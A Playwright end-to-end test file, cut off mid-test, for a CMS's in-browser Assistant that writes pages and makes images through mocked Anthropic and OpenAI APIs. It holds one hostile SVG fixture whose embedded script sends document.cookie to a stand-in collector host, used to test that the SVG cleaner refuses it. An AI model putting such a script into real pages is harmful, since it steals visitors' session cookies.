// The Assistant (src/assistant/README.md) in Chromium, the providers'
// APIs answered inside the browser: no key is real and nothing leaves the
// machine. A key is checked with its provider and kept; a brief becomes a
// new page, section by section, each a step of the Assistant's in History;
// the key goes to its provider and nowhere else, is found in no storage of
// the browser's, and a reload forgets it. After the page, the tokens the
// provider counted and what they come to at the model's list price, and at
// the drawer's foot the total since the key was connected, forgotten with
// it. Stats, steps and pricing land as blocks of their own, a plan's button
// whose address the brief does not give leading to the top of the page,
// said. A key the provider refuses is said and not kept; Forget key
// forgets it; with no key, the sample builds its page the same way; the
// drawer passes axe. In a block's panel, a heading is written again and an
// image of the library described, each shown before it is taken, with what
// it used, and taken as one step of the Assistant's. Pictures made for a
// page: OpenAI's photos with GPT Image 2 at the quality chosen, priced
// before and after, each a real WebP the fake answers with; Anthropic's
// illustrations, drawn by the browser from a clean SVG to a WebP, a
// hostile one refused; each into the CMS's library with its alt text, then
// onto the page as a step of its own; Stop stops those being made, and so
// do another page opened and the key forgotten, none asked after, nor
// with the key connected next.
import type { Page, Route } from "@playwright/test";
import { axe } from "./helpers/axe.ts";
import { block } from "./helpers/canvas.ts";
import { png } from "./helpers/images.ts";
import { cms, draftOf, drawer, expect, makePage, open, section, column, heading, test, unique } from "./helpers/site.ts";

const ANTHROPIC_KEY = "sk-ant-e2e-not-a-real-key-a1b2";
const OPENAI_KEY = "sk-proj-e2e-not-a-real-key-c3d4";
const words = (text: string) => ({ kind: "text", paragraphs: [text] });
const PLAN = JSON.stringify({
  title: "Open day",
  description: "Trial swims at the slipway on Saturday 12 April.",
  sections: [
    { label: "Hero", anchor: "", background: "soft", widths: "equal", columns: [{ align: "left", blocks: [{ kind: "heading", level: 1, text: "Open day at the slipway", display: true }, words("Saturday 12 April, from 8 to 11."), { kind: "button", label: "Book a place", target: "#book" }] }] },
    { label: "The morning", anchor: "", background: "none", widths: "equal", columns: [
      { align: "left", blocks: [{ kind: "iconbox", icon: "clock", title: "From 8 to 11", text: "Come when it suits you." }] },
      { align: "left", blocks: [{ kind: "iconbox", icon: "cup", title: "Hot drinks", text: "Tea on the slipway after." }] },
    ] },
    { label: "Book", anchor: "book", background: "primary", widths: "equal", columns: [{ align: "left", blocks: [{ kind: "heading", level: 2, text: "Book a place", display: false }, { kind: "form", fields: [{ type: "text", label: "Your name", required: true }, { type: "email", label: "Email", required: true }], submitLabel: "Book", confirmation: "See you there." }] }] },
  ],
});
// A page of the club's figures, the steps to join and its plans: the
// Family plan's button leads to an address the brief does not give.
const offer = (name: string, price: string, features: string[], target: string, featured = false) => ({ name, price, period: "a month", text: "", features, buttonLabel: "Join", buttonTarget: target, featured, badge: featured ? "For families" : "" });
const WIDGETS_PLAN = JSON.stringify({
  title: "Membership",
  description: "Join the swimming club: two plans, from €20 a month.",
  sections: [
    { label: "Club", anchor: "", background: "soft", widths: "equal", columns: [{ align: "left", blocks: [
      { kind: "heading", level: 1, text: "Swim with the club", display: true },
      { kind: "stats", figures: [{ value: "120", label: "Members" }, { value: "1987", label: "Swimming since" }] },
    ] }] },
    { label: "How to join", anchor: "how-to-join", background: "none", widths: "equal", columns: [{ align: "left", blocks: [
      { kind: "heading", level: 2, text: "How to join", display: false },
      { kind: "steps", steps: [{ title: "Come along", text: "Any Saturday at eight." }, { title: "Swim with a coach", text: "Close to the shore, at your pace." }, { title: "Join", text: "Choose a plan below." }] },
    ] }] },
    { label: "Plans", anchor: "", background: "none", widths: "equal", columns: [{ align: "left", blocks: [
      { kind: "heading", level: 2, text: "Membership", display: false },
      { kind: "pricing", plans: [offer("Swimmer", "€20", ["Two swims a week"], "#how-to-join"), offer("Family", "€45", ["Two adults and their children"], "https://club.example/join", true)] },
    ] }] },
  ],
});

const CORS = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "GET, POST, OPTIONS" };
const sse = (events: Array<[string | null, unknown]>) => events.map(([event, data]) => `${event ? `event: ${event}\n` : ""}data: ${typeof data === "string" ? data : JSON.stringify(data)}\n\n`).join("");
const pieces = (text: string) => text.match(/[\s\S]{1,48}/g) ?? [];

interface Asked {
  url: string;
  headers: Record<string, string>;
  body: unknown;
}

// A plan written from the question, as a model writes one from what the
// site has: a gym's page, its opening's picture the first image of the
// library the question lists, its points the site's icons, two sections
// coming into view, and its call to action said again at the end.
const RICH_PLAN = (system: string): string => {
  const library = /^ {2}- ([A-Za-z0-9_-]+): .* \((?:wide|tall|square|size unknown)/m.exec(system.slice(system.indexOf("Its library of images")))?.[1] ?? "none";
  const point = (icon: string, title: string, text: string) => ({ align: "left", blocks: [{ kind: "iconbox", icon, title, text }] });
  const none = { source: "none" };
  const band = (label: string, anchor: string, background: string, columns: unknown[], more: Record<string, unknown> = {}) => ({ label, anchor, background, picture: none, motion: "none", widths: "equal", columns, ...more });
  return JSON.stringify({
    title: "Modern fitness gym",
    description: "Strength, cardio, functional workouts and personal coaching, with a free first session.",
    sections: [
      band("Opening", "", "text", [{ align: "left", blocks: [
        { kind: "heading", level: 1, text: "Train stronger, every week", display: true },
        words("Strength training, cardio, functional workouts and coaching that keeps you going."),
        { kind: "button", label: "Book a free session", target: "#join" },
      ] }], { picture: { source: "library", mediaId: library, veil: "dark", strength: "strong", focus: "top" } }),
      band("What we offer", "", "none", [{ align: "center", blocks: [{ kind: "heading", level: 2, text: "Everything under one roof", display: false }, words("Four ways to train, one membership.")] }], { motion: "fade" }),
      band("Ways to train", "", "none", [
        point("dumbbell", "Strength", "Free weights, racks and platforms."),
        point("heart-pulse", "Cardio", "Rowers, bikes and treadmills."),
        point("activity", "Functional", "Circuits that build everyday strength."),
        point("user-round", "Coaching", "A coach who plans with you."),
      ], { motion: "rise" }),
      band("How it starts", "", "soft", [{ align: "left", blocks: [{ kind: "heading", level: 2, text: "How it starts", display: false }, { kind: "steps", steps: [
        { title: "Book a session", text: "Choose a time that suits you." }, { title: "Meet your coach", text: "Talk through what you want." }, { title: "Start training", text: "With a plan of your own." },
      ] }] }], { motion: "rise" }),
      band("Join", "join", "primary", [{ align: "center", blocks: [{ kind: "heading", level: 2, text: "Your first session is on us", display: false }, { kind: "button", label: "Book a free session", target: "#join" }] }]),
    ],
  });
};

// The question's system words, as a string or as text blocks.
const systemText = (system: unknown): string => (typeof system === "string" ? system : Array.isArray(system) ? system.map((part: { text?: unknown }) => (typeof part.text === "string" ? part.text : "")).join("\n") : "");

// The person's words of a question: its user message's text.
const userText = (body: { messages?: Array<{ content?: unknown }> }): string => {
  const content = body.messages?.[0]?.content;
  return Array.isArray(content) ? content.map((part: { text?: unknown }) => (typeof part.text === "string" ? part.text : "")).join("\n") : typeof content === "string" ? content : "";
};

// An illustration as a model draws one, in the colours the question gives:
// a sky, a low sun, water and a rower, in a landscape's viewBox.
function illustration(system: string): string {
  const tone = (slot: string, otherwise: string) => new RegExp(`${slot} (#[0-9a-fA-F]{6})`).exec(system)?.[1] ?? otherwise;
  const [sky, sun, water, ink, paper] = [tone("soft", "#e6efea"), tone("accent", "#f2a541"), tone("primary", "#1d4e6f"), tone("text", "#0e2a35"), tone("background", "#ffffff")];
  return [
    "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 600 400\">",
    `<defs><linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="${paper}"/><stop offset="1" stop-color="${sky}"/></linearGradient></defs>`,
    "<rect width=\"600\" height=\"400\" fill=\"url(#sky)\"/>",
    `<circle cx="420" cy="230" r="70" fill="${sun}"/>`,
    `<path d="M0 250 C 150 230, 450 270, 600 245 L600 400 L0 400 Z" fill="${water}"/>`,
    `<path d="M0 300 C 160 285, 430 320, 600 295 L600 400 L0 400 Z" fill="${ink}" opacity="0.6"/>`,
    `<g transform="translate(250 245)"><path d="M-70 8 L70 8 L60 16 L-60 16 Z" fill="${ink}"/><circle cx="0" cy="-22" r="9" fill="${ink}"/><path d="M-4 -12 L6 6 L-8 6 Z" fill="${ink}"/><line x1="-60" y1="-6" x2="60" y2="30" stroke="${ink}" stroke-width="4" stroke-linecap="round"/></g>`,
    "</svg>",
  ].join("");
}

// One a model was led to draw with a script in it: refused by the cleaner.
const HOSTILE_SVG = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 400 400\"><rect width=\"400\" height=\"400\" fill=\"#e6efea\"/><script>fetch('https://collector.example/k?'+document.cookie)</script></svg>";

// The answer to a question, by the schema it asks for: a page's plan, a
// heading written again, an image described, an illustration (a hostile
// one where it is asked to show a trophy). A plan may be written from the
// question itself.
function answerTo(body: { system?: unknown; messages?: Array<{ content?: unknown }>; output_config?: { format?: { schema?: { required?: string[] } } } }, plan: string | ((system: string) => string) = PLAN): string {
  const asked = body.output_config?.format?.schema?.required ?? [];
  if (asked.includes("sections")) return typeof plan === "string" ? plan : plan(systemText(body.system));
  if (asked.includes("decorative")) return JSON.stringify({ decorative: false, alt: "A small green and sand picture, split down the middle" });
  if (asked.includes("svg")) return JSON.stringify({ svg: /trophy/i.test(userText(body)) ? HOSTILE_SVG : illustration(systemText(body.system)) });
  return JSON.stringify({ text: "Swim at first light" });
}

// Anthropic's API answered here: the models a key may use, and one answer
// streamed as server-sent events, a page's being `plan`; a key other than
// `key` refused, as the API refuses it. With `hold`, an illustration is
// answered only once it lets go.
async function anthropic(page: Page, key = ANTHROPIC_KEY, plan: string | ((system: string) => string) = PLAN, hold?: Promise<void>): Promise<Asked[]> {
  const asked: Asked[] = [];
  await page.route("https://api.anthropic.com/**", async (route: Route) => {
    const request = route.request();
    if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: CORS });
    asked.push({ url: request.url(), headers: request.headers(), body: request.postDataJSON() as unknown });
    if (request.headers()["x-api-key"] !== key) {
      return route.fulfill({ status: 401, headers: CORS, contentType: "application/json", body: JSON.stringify({ type: "error", error: { type: "authentication_error", message: "invalid x-api-key" } }) });
    }
    if (request.url().includes("/v1/models")) {
      return route.fulfill({ headers: CORS, contentType: "application/json", body: JSON.stringify({
        data: [
          { type: "model", id: "claude-sonnet-5-5", display_name: "Claude Sonnet 5.5", created_at: "2026-09-10T00:00:00Z" },
          { type: "model", id: "claude-opus-5-5", display_name: "Claude Opus 5.5", created_at: "2026-08-01T00:00:00Z" },
        ],
        has_more: false, first_id: "claude-sonnet-5-5", last_id: "claude-opus-5-5",
      }) });
    }
    if (hold && JSON.stringify(request.postDataJSON()).includes("\"required\":[\"svg\"]")) await hold;
    return route.fulfill({ headers: { ...CORS, "content-type": "text/event-stream" }, body: sse([
      ["message_start", { type: "message_start", message: { id: "msg_e2e", type: "message", role: "assistant", model: "claude-opus-5-5", content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 1234, output_tokens: 1 } } }],
      ["content_block_start", { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } }],
      ...pieces(answerTo(request.postDataJSON() as Parameters<typeof answerTo>[0], plan)).map((text): [string, unknown] => ["content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "text_delta", text } }]),
      ["content_block_stop", { type: "content_block_stop", index: 0 }],
      ["message_delta", { type: "message_delta", delta: { stop_reason: "end_turn", stop_sequence: null }, usage: { output_tokens: 567 } }],
      ["message_stop", { type: "message_stop" }],
    ]) }).catch(() => undefined);
  });
  return asked;
}

// The tokens a photo's making counts out, by its quality: about what GPT
// Image 2's price per image is at 1536 by 1024, at $30 a million.
const PHOTO_TOKENS: Readonly<Record<string, number>> = { low: 160, medium: 1360, high: 5480 };

// OpenAI's API answered here, the same way, as Chat Completions streams; a
// page's plan `plan`. With `photo` (a WebP, in base64), the key may use GPT
// Image 2, and each photo asked of the Images API is answered with it and
// its usage, once `hold` lets it go.
async function openai(page: Page, options: { plan?: string; photo?: string; hold?: Promise<void> } = {}): Promise<Asked[]> {
  const asked: Asked[] = [];
  await page.route("https://api.openai.com/**", async (route: Route) => {
    const request = route.request();
    if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: CORS });
    asked.push({ url: request.url(), headers: request.headers(), body: request.postDataJSON() as unknown });
    if (request.url().includes("/v1/models")) {
      const images = options.photo === undefined ? [] : [
        { id: "gpt-image-1.5", object: "model", created: 1765000000, owned_by: "system" },
        { id: "gpt-image-2", object: "model", created: 1776000000, owned_by: "system" },
      ];
      return route.fulfill({ headers: CORS, contentType: "application/json", body: JSON.stringify({ object: "list", data: [{ id: "gpt-5", object: "model", created: 1754000000, owned_by: "openai" }, { id: "whisper-1", object: "model", created: 1, owned_by: "openai" }, ...images] }) });
    }
    if (request.url().endsWith("/v1/images/generations")) {
      await options.hold;
      const { quality, size } = request.postDataJSON() as { quality: string; size: string };
      const output = PHOTO_TOKENS[quality] ?? 1360;
      return route.fulfill({ headers: CORS, contentType: "application/json", body: JSON.stringify({
        created: 1, background: "opaque", output_format: "webp", quality, size,
        data: [{ b64_json: options.photo }],
        usage: { input_tokens: 50, input_tokens_details: { text_tokens: 50, image_tokens: 0 }, output_tokens: output, total_tokens: 50 + output },
      }) }).catch(() => undefined);
    }
    const chunk = (delta: Record<string, unknown>, finish: string | null = null) => ({ id: "c1", object: "chat.completion.chunk", created: 1, model: "gpt-5", choices: [{ index: 0, delta, finish_reason: finish }] });
    return route.fulfill({ headers: { ...CORS, "content-type": "text/event-stream" }, body: sse([
      ...pieces(options.plan ?? PLAN).map((content): [null, unknown] => [null, chunk({ content })]),
      [null, chunk({}, "stop")],
      [null, { id: "c1", object: "chat.completion.chunk", created: 1, model: "gpt-5", choices: [], usage: { prompt_tokens: 900, completion_tokens: 400, total_tokens: 1300, prompt_tokens_details: { cached_tokens: 300, cache_write_tokens: 200 } } }],
      [null, "[DONE]"],
    ]) });
  });
  return asked;
}

// A small real WebP, drawn by the browser itself: a warm floor under a
// dusk sky, as a fake photo.
async function webp(page: Page): Promise<string> {
  return page.evaluate(() => {
    const canvas = document.createElement("canvas");
    canvas.width = 192;
    canvas.height = 128;
    const draw = canvas.getContext("2d")!;
    const sky = draw.createLinearGradient(0, 0, 0, 128);
    sky.addColorStop(0, "#3b4a6b");
    sky.addColorStop(0.6, "#e9a15b");
    draw.fillStyle = sky;
    draw.fillRect(0, 0, 192, 128);
    draw.fillStyle = "#2b2f36";
    draw.fillRect(0, 88, 192, 40);
    for (const [x, r] of [[40, 10], [96, 14], [150, 9]] as const) {
      draw.fillStyle = "rgba(255, 236, 200, 0.55)";
      draw.beginPath();
      draw.arc(x, 40, r, 0, Math.PI * 2);
      draw.fill();
    }
    return canvas.toDataURL("image/webp", 0.8).split(",")[1]!;
  });
}

// What the CMS's library holds, newest first.
async function libraryOf(request: Parameters<typeof makePage>[0]): Promise<Array<{ id: string; alt: string; filename: string; contentType: string; width: number; height: number }>> {
  return ((await (await request.get(`${cms()}/api/media`)).json()) as { media: never[] }).media;
}

// Everything the browser keeps for this site: its two storages, its
// cookies, its address, every IndexedDB database's every record, its caches.
async function keptByTheBrowser(page: Page): Promise<string> {
  return page.evaluate(async () => {
    const parts = [JSON.stringify({ ...localStorage }), JSON.stringify({ ...sessionStorage }), document.cookie, location.href];
    for (const info of await indexedDB.databases()) {
      if (!info.name) continue;
      const db = await new Promise<IDBDatabase>((done, fail) => {
        const opening = indexedDB.open(info.name!);
        opening.onsuccess = () => done(opening.result);
        opening.onerror = () => fail(opening.error);
      });
      for (const store of Array.from(db.objectStoreNames)) {
        const all = await new Promise<unknown[]>((done, fail) => {
          const reading = db.transaction(store).objectStore(store).getAll();
          reading.onsuccess = () => done(reading.result);
          reading.onerror = () => fail(reading.error);
        });
        parts.push(JSON.stringify(all, (_key, value: unknown) => (value instanceof Blob ? "(a file)" : value)));
      }
      db.close();
    }
    for (const name of await caches.keys()) parts.push(name);
    return parts.join("\n");
  });
}

// The page's own sections on the canvas: not the site's header's and footer's.
const pageSections = (page: Page) => page.locator(".canvas [data-block-type='section']:not([data-theme-part] *)");

async function assistant(page: Page) {
  const box = page.getByRole("complementary", { name: "Assistant", exact: true });
  if (!(await box.isVisible())) await page.locator(".topbar").getByRole("button", { name: "Assistant", exact: true }).click();
  await expect(box).toBeVisible();
  return box;
}

async function startOn(page: Page, request: Parameters<typeof makePage>[0], title: string) {
  const { id } = await makePage(request, title, [section("s1", "Start", [column("c1", [heading("h1", "Start")])])]);
  await open(page, id);
}

test("a key kept in this tab's memory writes a page from a brief, each section a step of the Assistant's; the key goes only to its provider, no storage holds it, and a reload forgets it", async ({ page, request }) => {
  const asked = await anthropic(page);
  await startOn(page, request, "Before the Assistant");
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await expect(box.getByLabel("Model")).toHaveValue("claude-opus-5-5");
  await expect(box.getByLabel("Your Anthropic key")).toHaveCount(0);

  await box.getByLabel("What is the page for?").fill("An open day at the club on Saturday 12 April, from 8 to 11, with trial swims and a booking form.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "3 sections on “Open day”" })).toBeVisible();
  await expect(page.getByRole("button", { name: /^Switch page\. Open: Open day/ })).toBeVisible();
  await expect(pageSections(page)).toHaveCount(3);
  await expect(box.getByRole("listitem")).toHaveText(["Hero", "The morning", "Book"]);

  // What it used, as the provider counted it, and what that comes to at
  // Claude Opus 5.5's list price: 1,234 × $4 + 567 × $20 a million tokens.
  await expect(box.locator(".as-used")).toHaveText("Used 1,234 tokens in and 567 out, on your key.");
  await expect(box.locator(".as-cost")).toHaveText("≈ $0.016 at Claude Opus 5.5's list price ($4 in, $20 out per million tokens; prices of 20 Oct 2026).");
  await expect(box.locator(".drawer-foot > p")).toHaveText([
    "Since you connected this key: 1 request, 1,234 tokens in and 567 out, ≈ $0.016.",
    "An estimate from the providers' list prices. The provider's bill is what counts: taxes, discounts and regional uplift are not included.",
  ]);

  const history = page.getByRole("complementary", { name: "History", exact: true });
  await page.locator(".topbar").getByRole("button", { name: "History", exact: true }).click();
  // The newest step first, as History lists them.
  await expect(history.locator(".hist-what")).toHaveText([
    "Assistant added section Book",
    "Assistant added section The morning",
    "Assistant added section Hero",
    "Assistant changed the page description",
  ]);

  // The key went to Anthropic, on each call, and in no request's body.
  const message = asked.find((call) => call.url.endsWith("/v1/messages"))!;
  expect(message.headers["x-api-key"]).toBe(ANTHROPIC_KEY);
  expect(message.body).toMatchObject({ model: "claude-opus-5-5", thinking: { type: "adaptive" }, output_config: { format: { type: "json_schema" } } });
  expect(JSON.stringify(message.body)).not.toContain(ANTHROPIC_KEY);
  // Nothing the browser keeps holds it.
  expect(await keptByTheBrowser(page)).not.toContain(ANTHROPIC_KEY);

  await page.reload();
  await expect(page.getByRole("button", { name: /^Switch page\. Open:/ })).toBeVisible();
  const again = await assistant(page);
  await expect(again.getByLabel("Your Anthropic key")).toBeVisible();
  await expect(again.getByText(/key …/)).toHaveCount(0);
  // The total went with the key.
  await expect(again.getByText(/Since you connected this key/)).toHaveCount(0);
});

test("stats, steps and pricing land as blocks of their own; a plan's button whose address the brief does not give keeps its words, leads to the top of the page, and is said", async ({ page, request }) => {
  await anthropic(page, ANTHROPIC_KEY, WIDGETS_PLAN);
  await startOn(page, request, "Before the widgets");
  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await box.getByLabel("What is the page for?").fill("Membership of the swimming club: 120 members, swimming since 1987. Swimmer €20 a month, Family €45 a month for two adults and their children. Come along any Saturday at eight.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "3 sections on “Membership”" })).toBeVisible();
  await expect(box.getByRole("listitem")).toHaveText(["Club", "How to join", "Plans"]);

  const canvas = page.locator(".canvas");
  await expect(canvas.locator("[data-block-type='stats'] dd")).toHaveText(["120", "1987"]);
  await expect(canvas.locator("[data-block-type='stats'] dt")).toHaveText(["Members", "Swimming since"]);
  await expect(canvas.locator("[data-block-type='steps'] li > h3")).toHaveText(["Come along", "Swim with a coach", "Join"]);
  const pricing = canvas.locator("[data-block-type='pricing']");
  await expect(pricing.locator("li.sw-plan > h3")).toHaveText(["Swimmer", "Family"]);
  await expect(pricing.locator(".sw-plan-price strong")).toHaveText(["€20", "€45"]);
  await expect(pricing.locator("li.sw-plan[data-featured] > .sw-plan-badge")).toHaveText("For families");
  const buttons = pricing.locator(".sw-plan-action > a.sw-btn");
  await expect(buttons).toHaveText(["Join", "Join"]);
  await expect(buttons.nth(0)).toHaveAttribute("href", "#how-to-join");
  await expect(buttons.nth(1)).toHaveAttribute("href", "#");

  await box.getByText("One thing was left out").click();
  await expect(box.getByText("Left out the link of the button “Join” of the plan “Family”: it would lead to an address the brief does not give.")).toBeVisible();
});

test("a page with rhythm: the library's picture behind its opening under a veil, points side by side with the site's new icons, sections coming into view, its call to action said again at the end", async ({ page, request }) => {
  await anthropic(page, ANTHROPIC_KEY, RICH_PLAN);
  await startOn(page, request, "Before the gym");
  // An image in the library for the plan to name, uploaded and not placed.
  await block(page, "h1").click();
  await drawer(page, "Insert");
  await page.getByRole("group", { name: "Basic" }).getByRole("button", { name: "Image" }).click();
  const library = page.getByRole("dialog", { name: "Media library" });
  const name = `${unique("gym-floor")}.png`;
  await library.getByLabel("Images to upload").setInputFiles({ name, mimeType: "image/png", buffer: png(160, 90, (x, y) => (y < 45 ? [40, 44, 52] : x < 80 ? [180, 60, 40] : [230, 220, 200])) });
  await expect(library.getByRole("radio", { name: `${name}, no alt text` })).toHaveAttribute("aria-checked", "true", { timeout: 30_000 });
  await library.getByRole("textbox", { name: /^Alt text/ }).fill("The gym floor at opening");
  await library.getByRole("textbox", { name: /^Alt text/ }).press("Enter");
  await library.getByRole("button", { name: "Cancel" }).click();
  await expect(library).toHaveCount(0);

  const box = await assistant(page);
  await box.getByLabel("Your Anthropic key").fill(ANTHROPIC_KEY);
  await box.getByRole("button", { name: "Connect Anthropic" }).click();
  await expect(box.getByText("key …a1b2")).toBeVisible();
  await box.getByLabel("What is the page for?").fill("A modern fitness gym offering strength training, cardio, functional workouts, and personal coaching. The first session is free.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "5 sections on “Modern fitness gym”" })).toBeVisible();
  await expect(box.getByText(/things? (was|were) left out/)).toHaveCount(0);

  const sections = pageSections(page);
  await expect(sections).toHaveCount(5);
  // The opening: the library's picture behind it, decorative, loaded at
  // once, under a strong dark veil kept at its top.
  const opening = sections.first();
  const picture = opening.locator(":scope > picture.sw-picture > img");
  await expect(picture).toHaveAttribute("alt", "");
  await expect(picture).toHaveAttribute("loading", "eager");
  await expect(picture).toHaveJSProperty("complete", true);
  expect(await picture.evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(160);
  await expect(opening).toHaveAttribute("data-veil", "dark");
  await expect(opening).toHaveAttribute("data-veil-strength", "strong");
  await expect(opening).toHaveAttribute("data-focus", "top");
  // Its words in the colour that reads on the veil: the site's paper.
  await expect(opening.locator("h1")).toHaveCSS("color", "rgb(255, 255, 255)");
  // Points side by side, each its icon of the site's set, drawn inline.
  const points = sections.nth(2).locator("[data-block-type='iconbox']");
  await expect(points).toHaveCount(4);
  expect(await points.evaluateAll((boxes) => boxes.map((box) => [box.getAttribute("data-icon"), box.querySelectorAll("svg.sw-icon > :is(path, circle, line, rect)").length > 0]))).toEqual([
    ["dumbbell", true], ["heart-pulse", true], ["activity", true], ["user-round", true],
  ]);
  const tops = await points.evaluateAll((boxes) => boxes.map((box) => Math.round(box.getBoundingClientRect().top)));
  expect(new Set(tops).size).toBe(1);
  // Two sections come into view, the others are still; none moves on the canvas.
  expect(await sections.evaluateAll((all) => all.map((section) => section.getAttribute("data-motion")))).toEqual([null, "fade", "rise", "rise", null]);
  expect(await sections.nth(2).evaluate((section) => getComputedStyle(section).animationName)).toBe("none");
  // The call to action, said again at the end, leads where the opening's does.
  await expect(sections.locator("a.sw-btn")).toHaveText(["Book a free session", "Book a free session"]);
  expect(await sections.locator("a.sw-btn").evaluateAll((links) => links.map((link) => link.getAttribute("href")))).toEqual(["#join", "#join"]);
});

test("OpenAI: the same page, asked with a strict schema; models it cannot use are not offered", async ({ page, request }) => {
  const asked = await openai(page);
  await startOn(page, request, "Before OpenAI");
  const box = await assistant(page);
  await box.getByRole("radio", { name: "OpenAI" }).click();
  await box.getByLabel("Your OpenAI key").fill(OPENAI_KEY);
  await box.getByRole("button", { name: "Connect OpenAI" }).click();
  await expect(box.getByText("key …c3d4")).toBeVisible();
  await expect(box.getByLabel("Model").locator("option")).toHaveText(["gpt-5"]);
  await box.getByLabel("What is the page for?").fill("An open day at the club.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "3 sections on “Open day”" })).toBeVisible();
  const completion = asked.find((call) => call.url.endsWith("/v1/chat/completions"))!;
  expect(completion.headers.authorization).toBe(`Bearer ${OPENAI_KEY}`);
  expect(completion.body).toMatchObject({ model: "gpt-5", stream: true, response_format: { type: "json_schema", json_schema: { name: "page_plan", strict: true } } });
  // 400 × $1.25 + 300 cached × $0.125 + 200 written to the cache × $1.25
  // (gpt-5's page gives a dash for cache writes) + 400 × $10 a million
  // tokens: under a cent.
  await expect(box.locator(".as-used")).toHaveText("Used 900 tokens in, 300 of them cached and 200 written to the cache, and 400 out, on your key.");
  await expect(box.locator(".as-cost")).toHaveText("Under $0.01 ($0.0048) at gpt-5's list price ($1.25 in, $0.125 cached, $1.25 written to the cache, $10 out per million tokens; prices of 20 Oct 2026).");
  await expect(box.locator(".as-total")).toHaveText("Since you connected this key: 1 request, 900 tokens in, 300 of them cached and 200 written to the cache, and 400 out, under $0.01 ($0.0048).");
});

// A gym's page with three pictures made for it: a photo behind its opening,
// and one above each of its two cards.
const MADE_PLAN = JSON.stringify({
  title: "Gym",
  description: "Strength and cardio, with a coach beside you.",
  sections: [
    { label: "Opening", anchor: "", background: "text", motion: "none", widths: "equal",
      picture: { source: "made", prompt: "A bright gym floor at dawn, racks and free weights, seen from the door.", alt: "The gym floor at dawn", shape: "landscape", veil: "dark", strength: "strong", focus: "center" },
      columns: [{ align: "left", blocks: [{ kind: "heading", level: 1, text: "Train stronger", display: true }, words("Strength and cardio, with a coach beside you."), { kind: "button", label: "Book a session", target: "#classes" }] }] },
    { label: "Classes", anchor: "classes", background: "none", motion: "rise", widths: "equal", picture: { source: "none" }, columns: [
      { align: "left", blocks: [{ kind: "image", source: "made", prompt: "A coach beside a lifter at a squat rack.", alt: "A coach beside a lifter", shape: "square" }, { kind: "heading", level: 2, text: "Strength", display: false }, words("Free weights and racks.")] },
      { align: "left", blocks: [{ kind: "image", source: "made", prompt: "Rowing machines in a row by a tall window.", alt: "Rowers by the window", shape: "square" }, { kind: "heading", level: 2, text: "Cardio", display: false }, words("Rowers, bikes and treadmills.")] },
    ] },
  ],
});

test("OpenAI: photos made for the page with GPT Image 2 at the quality chosen, its price per photo said before; each into the library with its alt text, then onto its section or card as a step of its own; their cost after", async ({ page, request }) => {
  await startOn(page, request, "Before the photos");
  const photo = await webp(page);
  const asked = await openai(page, { plan: MADE_PLAN, photo });
  const box = await assistant(page);
  // Where the provider is chosen, what each one does.
  await expect(box.locator(".as-compare dd")).toHaveText([
    "Writes pages, and draws illustrations for them in the site's colours, as its models make no photos.",
    "Writes pages, and makes photos for them, each at a cost shown before you write.",
  ]);
  await box.getByRole("radio", { name: "OpenAI" }).click();
  await box.getByLabel("Your OpenAI key").fill(OPENAI_KEY);
  await box.getByRole("button", { name: "Connect OpenAI" }).click();
  await expect(box.getByText("key …c3d4")).toBeVisible();
  // Image models are not offered to write; photos are on, at medium, priced before.
  await expect(box.getByLabel("Model").locator("option")).toHaveText(["gpt-5"]);
  await expect(box.getByRole("switch", { name: "Make photos for the page" })).toBeChecked();
  const quality = box.getByRole("radiogroup", { name: "Photo quality" });
  await expect(quality.getByRole("radio", { name: "Medium" })).toHaveAttribute("aria-checked", "true");
  await expect(box.locator(".as-price")).toHaveText("$0.041 a photo, landscape or portrait, $0.053 a square one, at gpt-image-2's price per image of 20 Oct 2026. Up to 5 on a page: $0.265 at most.");
  expect((await axe(page, { include: ".drawer-assistant" })).serious).toEqual([]);
  await quality.getByRole("radio", { name: "Low" }).click();
  await expect(box.locator(".as-price")).toHaveText("$0.005 a photo, landscape or portrait, $0.006 a square one, at gpt-image-2's price per image of 20 Oct 2026. Up to 5 on a page: $0.03 at most.");

  await box.getByLabel("What is the page for?").fill("A gym: strength and cardio, with a coach beside you.");
  await box.getByRole("button", { name: "Write the page" }).click();
  await expect(box.getByRole("status").filter({ hasText: "2 sections and 3 photos on “Gym”" })).toBeVisible({ timeout: 30_000 });
  await expect(box.getByRole("listitem")).toHaveText(["Opening", /^Photo behind Opening, in, under \$0\.01 \(\$0\.0051\)$/, "Classes", /^Photo in Classes, in, /, /^Photo in Classes, in, /]);

  // The plan was asked with pictures it may make; each photo of GPT Image 2, low, its shape's size, a WebP.
  const completion = asked.find((call) => call.url.endsWith("/v1/chat/completions"))!.body as { response_format: { json_schema: { schema: unknown } } };
  expect(JSON.stringify(completion.response_format.json_schema.schema)).toContain("\"enum\":[\"made\"]");
  const photos = asked.filter((call) => call.url.endsWith("/v1/images/generations")).map((call) => call.body as Record<string, unknown>);
  expect(photos.map(({ model, size, quality: chosen, n, output_format, output_compression }) => [model, size, chosen, n, output_format, output_compression])).toEqual([
    ["gpt-image-2", "1536x1024", "low", 1, "webp", 80], ["gpt-image-2", "1024x1024", "low", 1, "webp", 80], ["gpt-image-2", "1024x1024", "low", 1, "webp", 80],
  ]);
